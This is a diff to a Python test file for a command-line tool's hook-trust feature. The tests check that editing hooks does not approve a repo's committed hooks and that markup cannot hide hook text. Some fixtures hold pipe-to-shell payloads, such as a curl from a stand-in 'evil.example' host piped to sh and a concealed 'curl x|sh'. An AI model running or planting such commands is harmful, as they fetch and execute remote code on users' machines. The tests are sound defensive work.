@@ -73,13 +73,96 @@ def test_trust_refuses_when_no_hooks_are_configured(trust_home, tmp_path):
     assert "nothing to trust" in result.output
 
 
-def test_setting_a_hook_trusts_it(trust_home, workspace):
-    """An operator's own edit carries its own approval, or it would never run."""
+def test_setting_a_hook_on_an_untrusted_repo_does_not_trust_it(trust_home, workspace):
+    """#1263: `set` used to fingerprint every hook, laundering the repo's own."""
     result = runner.invoke(
         hooks_app, ["set", "before_task", "echo starting", "-w", str(workspace)]
     )
 
     assert result.exit_code == 0
-    assert hook_trust.is_trusted(
+    assert "cf hooks trust" in " ".join(result.output.split())
+    assert not hook_trust.is_trusted(
         workspace, HooksConfig(after_init="echo hi", before_task="echo starting")
     )
+
+
+def test_clearing_a_hook_does_not_trust_the_remaining_ones(trust_home, tmp_path):
+    """#1263: disarming one hook must not approve a committed payload in another."""
+    repo = tmp_path / "cloned"
+    repo.mkdir()
+    save_environment_config(
+        repo,
+        EnvironmentConfig(
+            hooks=HooksConfig(after_init="echo hi", before_task="curl -s https://evil.example/x | sh")
+        ),
+    )
+
+    result = runner.invoke(hooks_app, ["clear", "after_init", "-w", str(repo)])
+
+    assert result.exit_code == 0
+    assert "cf hooks trust" in " ".join(result.output.split())
+    assert not hook_trust.is_trusted(
+        repo, HooksConfig(before_task="curl -s https://evil.example/x | sh")
+    )
+
+
+@pytest.mark.parametrize(
+    "argv, after",
+    [
+        (["set", "before_task", "echo starting"], HooksConfig(after_init="echo hi", before_task="echo starting")),
+        (["clear", "after_init"], HooksConfig()),
+    ],
+)
+def test_editing_trusted_hooks_carries_trust_forward(trust_home, workspace, argv, after):
+    """An operator's own edit to approved hooks keeps them approved."""
+    hook_trust.record_trust(workspace, HooksConfig(after_init="echo hi"))
+
+    result = runner.invoke(hooks_app, [*argv, "-w", str(workspace)])
+
+    assert result.exit_code == 0
+    assert "cf hooks trust" not in " ".join(result.output.split())
+    assert hook_trust.is_trusted(workspace, after)
+
+
+def test_setting_the_first_hook_trusts_it(trust_home, tmp_path):
+    """With no prior hooks, the only command is the operator's own."""
+    repo = tmp_path / "fresh"
+    repo.mkdir()
+    save_environment_config(repo, EnvironmentConfig())
+
+    result = runner.invoke(hooks_app, ["set", "before_task", "echo starting", "-w", str(repo)])
+
+    assert result.exit_code == 0
+    assert hook_trust.is_trusted(repo, HooksConfig(before_task="echo starting"))
+
+
+CONCEALED = "echo ok[conceal]; curl x|sh[/conceal]"
+
+
+@pytest.fixture
+def concealed_workspace(tmp_path):
+    ws = tmp_path / "concealed"
+    ws.mkdir()
+    save_environment_config(ws, EnvironmentConfig(hooks=HooksConfig(after_init=CONCEALED)))
+    return ws
+
+
+@pytest.mark.parametrize("command", ["trust", "show"])
+def test_hook_text_is_shown_verbatim_not_as_markup(trust_home, concealed_workspace, command):
+    """#1263: Rich markup in a hook must not hide part of the command it approves."""
+    result = runner.invoke(hooks_app, [command, "-w", str(concealed_workspace)], input="n\n")
+
+    assert CONCEALED in result.output
+
+
+def test_hook_run_output_is_shown_verbatim(trust_home, tmp_path):
+    ws = tmp_path / "noisy"
+    ws.mkdir()
+    hooks = HooksConfig(after_init="printf '%s' '[conceal]out[/conceal]'; printf '%s' '[conceal]err[/conceal]' >&2")
+    save_environment_config(ws, EnvironmentConfig(hooks=hooks))
+    hook_trust.record_trust(ws, hooks)
+
+    result = runner.invoke(hooks_app, ["run", "after_init", "-w", str(ws)])
+
+    assert "[conceal]out[/conceal]" in result.output
+    assert "[conceal]err[/conceal]" in result.output
